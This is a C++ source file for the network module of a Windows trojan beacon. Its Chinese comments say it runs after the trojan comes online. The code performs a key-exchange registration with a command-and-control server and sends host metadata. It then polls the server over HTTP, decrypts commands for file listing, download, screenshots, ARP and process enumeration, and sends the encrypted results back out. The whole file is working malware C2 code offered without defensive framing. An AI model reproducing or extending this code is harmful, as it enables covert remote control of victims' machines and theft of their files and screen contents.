#include "Network.hpp"

OblivionisConfig config;
Queue head = nullptr, end = nullptr;
OblivionisAES *globalAES;

#define TOTAL_PRINTF printf
char httpPostHead[512];
int httpPostHeadLen;
char httpGetHead[512];
int httpGetHeadLen;
unsigned char temp[2];

SOCKET sock;
sockaddr_in addr;

Queue outQueue() {
    Queue tmp = head;
    if(head == end) {
        head = nullptr;
        end = nullptr;
        return tmp;
    }
    head = (Queue)tmp->next;
    return tmp;
}
// 这里应该放入需要发送的 Json 文本
void inQueue(char *msg) {
    Queue node = (Queue)malloc(16);
    node->next = nullptr;
    node->message = msg;
    if(head == nullptr) {
        head = node;
        end = node;
    }else {
        end->next = node;
        end = node;
    }
}
OblivionisConfig *getConfig() {
    return &config;
}
// 网络套组的初始化, 初始化两种请求头
void networkSuitInitial() {
    httpPostHeadLen = sprintf(httpPostHead, "POST /%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nCache-Control: no-cache\r\nCustom-Header1: Value1\r\nCustom-Header2: Value2\r\nContent-Length: ", config.url, config.useragent, config.host);
    const char *tail = "%d\r\n\r\n%s";
    memmove(httpPostHead + httpPostHeadLen, tail, 8);
    httpPostHeadLen += 8;
    httpPostHead[httpPostHeadLen] = 0;
    //TOTAL_PRINTF("httphead POST = \n%s\n", httpPostHead);
    //hexDump((PBYTE)httpPostHead, httpPostHeadLen);
    //TOTAL_PRINTF("\n");

    httpGetHeadLen = sprintf(httpGetHead, "GET /%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nCustom-Header1: Value1\r\nCustom-Header2: Value2\r\nCookie: cookie1=", config.url, config.useragent, config.host);
    tail = "%s\r\n\r\n";
    memmove(httpGetHead + httpGetHeadLen, tail, 6);
    httpGetHeadLen += 6;
    httpGetHead[httpGetHeadLen] = 0;
    //TOTAL_PRINTF("httphead GET = \n%s\n", httpGetHead);
    //hexDump((PBYTE)httpGetHead, httpGetHeadLen);
    //TOTAL_PRINTF("\n");
    initSocket();
}

/* Socket 配置信息的初始化
 * 只调用一次, 后续重复连接只需调用 connectSocket */
void initSocket() {
    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        //TOTAL_PRINTF("error at WSAStartup\n");
        exit(-1);
    }
   
    addr.sin_family = AF_INET;
    addr.sin_addr.S_un.S_addr = inet_addr(config.c2addr);
    addr.sin_port = htons(config.c2port);
}

// 每次向 C2 发包, 都应该重新建立一次 TCP 连接
void connectSocket() {
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock == INVALID_SOCKET) {
        //TOTAL_PRINTF("Error at create socket\n");
        exit(-1);
    }
    if(connect(sock, (sockaddr *)&addr, sizeof(addr)) != 0) {
        //TOTAL_PRINTF("Error in connect. code = %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        exit(-1);
    }
}

char buf[0x600000];
/* ok 是接收到的 200 OK 响应包
 * 将会读取响应包中的数据部分
 * 使用 data 和 len 分别存储数据部分的指针和长度 */
void analyze200OK(char *ok, char **data, int *len) {
    const char *data_start = strstr(ok, "\r\n\r\n");
    const char *content_length_start = strstr(ok, "Content-Length: ");
    content_length_start += 16; // len("Content-Length: ") = 16
    int content_length;
    sscanf(content_length_start, "%d", &content_length);
    *data = (char *)(data_start + 4);
    *len = content_length;
}

#define RECV_BUF recv(sock, buf, 4096, 0);
#define CLOSE_SOCK closesocket(sock);
/* 木马上线后, 将定期向 C2 发送一次 Post 请求
 * 同时用这个函数接收一次 200 OK 响应
 * 因此在这个函数中需要存在针对 C2 命令的解析 */
char cmd[0x600000];
void Receive200OK() {
    int recvLen = RECV_BUF
    CLOSE_SOCK

    //TOTAL_PRINTF("received %d bytes\n", recvLen);
    // todo
    char *encryptCMD;
    int cmdLen;
    analyze200OK(buf, &encryptCMD, &cmdLen);
    if(cmdLen == 0) return;

    //TOTAL_PRINTF("encryptCMD = \n");
    //hexDump((PBYTE)encryptCMD, cmdLen);

    memmove(cmd, encryptCMD, cmdLen);
    globalAES->DecryptData((PBYTE)cmd, &cmdLen);

    //TOTAL_PRINTF("Decrypted CMD = \n");
    //hexDump((PBYTE)cmd, cmdLen);
    
    short cmdNum = *((short *)cmd);
    char *args = cmd + 2;
    int argsLen = cmdLen - 2;
    args[argsLen] = '\x00';
    //TOTAL_PRINTF("cmd = %d, args = %s\n", cmdNum, args);

    char *message;
    int msgLen;
    switch(cmdNum) {
        case 2: message = commandEcho(args, argsLen, &msgLen); break;
        case 3: message = command_ls(args, argsLen, &msgLen); break;
        case 4: message = command_download(args, argsLen, &msgLen); break;
        case 5: message = command_screenshot(args, argsLen, &msgLen); break;
        case 6: message = command_arp(args, argsLen, &msgLen); break;
        case 7: message = command_process(args, argsLen, &msgLen); break;
        default: message = nullptr;
    }
    if(message != nullptr) {
        inQueue(message);
    }
    //TOTAL_PRINTF("close socket\n");
    
}
/* 在套接字已建立连接的情况下
 * 调用这个函数来向 C2 发送数据包 */
void sockSend(char *buf, int len) {
    if(send(sock, buf, len, 0) == SOCKET_ERROR) {
        //TOTAL_PRINTF("Error in send\n");
        closesocket(sock);
        WSACleanup();
        exit(0);
    }
}
char msgEncrypt[0x600000];
void PostBreath() {
    while(true) {
        //TOTAL_PRINTF("try to breath\n");
        Sleep(config.sleep);
        connectSocket();
        Queue node = outQueue();
        int len;
        if(node == nullptr) {
            len = sprintf(buf, httpPostHead, 0, "");
        }else {
            int msgLen = strlen(node->message);
            memmove(msgEncrypt, node->message, msgLen);
            globalAES->EncryptData((PBYTE)msgEncrypt, &msgLen);
            
            len = sprintf(buf, httpPostHead, msgLen, temp) - 1;
            for(int i = 0; i < msgLen; i++) {
                buf[len + i] = msgEncrypt[i];
            }
            len += msgLen;
            free(node->message);
            free(node);
        }
        
        sockSend(buf, len);
        //TOTAL_PRINTF("send %d bytes\n", len);
        Receive200OK();
    }
}
const char *info = "{\"mtdt\":{\"h_name\":\"Desktop-win-99k2\", \"wver\":\"windows 10\", \"arch\":\"x86-64\", \"p_name\":\"D://beacon.exe\", \"uid\":\"admin\", \"pid\":\"9871\"}}";
#define RandomU128 Uint128((size_t)(rand()) << 32 | rand(), (size_t)(rand()) << 32 | rand())
void registerC2() {
    int i;
    int base64Len;
    int len;
    PBYTE encryptA;
    char *base64;
    int encryptA_Len;
    temp[0] = 'a'; temp[1] = 0;
    /*
    Uint128 b11 = RandomU128;
    Uint128 a1 = Uint128(config.a);
    Uint128 a_b11 = a1.modPow(b11);
    encryptA = a_b11.toBytes();
    len = sprintf(buf, httpPostHead, 16, temp) - 1;
    hexDump((PBYTE)buf, len);
    //TOTAL_PRINTF("\n\n");
    for(i = 0; i < 16; i++) {
        buf[len + i] = encryptA[i];
    }
    len += 16;
    hexDump((PBYTE)buf, len);*/

    // Step.1 向 C2 发送 GET 请求, cookie 中包含 Base64[AES(a, a)]
    //TOTAL_PRINTF("Step.1 Send GET to C2, cookie = Base64[AES(a, a)]\n");

    OblivionisAES aes(config.a);
    encryptA = (PBYTE)malloc(0x24);
    encryptA_Len = 16;
    memmove(encryptA, config.a, 16);
    aes.EncryptData(encryptA, &encryptA_Len);
    base64 = base64_encode(encryptA, encryptA_Len, &base64Len);
    len = sprintf(buf, httpGetHead, base64);


    //TOTAL_PRINTF("base64 = %s\n", base64);
    //TOTAL_PRINTF("HTTP Request = \n%s\n", buf);
    connectSocket();
    sockSend(buf, len);
    free(base64);
    free(encryptA);

    // Step.2 接收 C2 发回的 200 OK，查看其中是否存在 0xbeebeebe
    //TOTAL_PRINTF("Step.2 Receive 200 OK from C2, check the 0xbeebeebe\n");
    RECV_BUF
    CLOSE_SOCK
    analyze200OK(buf, &base64, &len);
    if(*((DWORD *)base64) != 0xbeebeebe) {
        //TOTAL_PRINTF("Cannot found 0xbeebeebe, or failed to analyze 200 OK pack\n");
        //exit(0);
    }else {
        //TOTAL_PRINTF("Receive 0xbeebeebe successful\n");
    }


    // Step.3 向 C2 发送 a^b1
    Uint128 b1 = RandomU128;
    Uint128 a = Uint128(config.a);
    Uint128 a_b1 = a.modPow(b1);
    encryptA = a_b1.toBytes();
    len = sprintf(buf, httpPostHead, 16, temp) - 1;
    for(i = 0; i < 16; i++) {
        buf[len + i] = encryptA[i];
    }
    len += 16;
    //TOTAL_PRINTF("Step.3 Send a^b1 to C2.\n");
    //TOTAL_PRINTF("a^b1 = \n");
    //hexDump(encryptA, 16);
    //TOTAL_PRINTF("as hex = ");
    a_b1.printHex();
    //TOTAL_PRINTF("\n");

    Sleep(config.sleep);
    connectSocket();
    sockSend(buf, len);


    // Step.4 接收 C2 发来的 a^b2
    RECV_BUF
    CLOSE_SOCK
    analyze200OK(buf, &base64, &len);
    //TOTAL_PRINTF("Step.4 Receive a^b2 from C2\n");
    Uint128 a_b2 = Uint128((PBYTE)base64);
    Uint128 key = a_b2.modPow(b1);
    globalAES = new OblivionisAES(key.toBytes());
    //TOTAL_PRINTF("a^b2 = \n");
    //hexDump(a_b2.toBytes(), 16);
    //TOTAL_PRINTF("as hex = ");
    //a_b2.printHex();
    //TOTAL_PRINTF("\nKey = \n");
    //hexDump(key.toBytes(), 16);
    //TOTAL_PRINTF("as hex = ");
    //key.printHex();


    // Step.5 提交宿主机信息
    //TOTAL_PRINTF("\nStep.5 Post info of the computer.\n");
    char buf2[1024];
    for(len = 0; info[len] != '\x00'; len++) {
        buf2[len] = info[len];
    }
    len++;
    //hexDump((PBYTE)buf2, len);
    globalAES->EncryptData((PBYTE)buf2, &len);
    //TOTAL_PRINTF("\nencrypt data = \n");
    //hexDump((PBYTE)buf2, len);
    //TOTAL_PRINTF("\nAES key = \n");
    //hexDump(globalAES->g_Key, 176);

    int httpLen = sprintf(buf, httpPostHead, len, temp) - 1;
    for(i = 0; i < len; i++) {
        buf[httpLen + i] = buf2[i];
    }
    httpLen += len;
    Sleep(config.sleep);
    connectSocket();
    sockSend(buf, httpLen);
    CLOSE_SOCK
}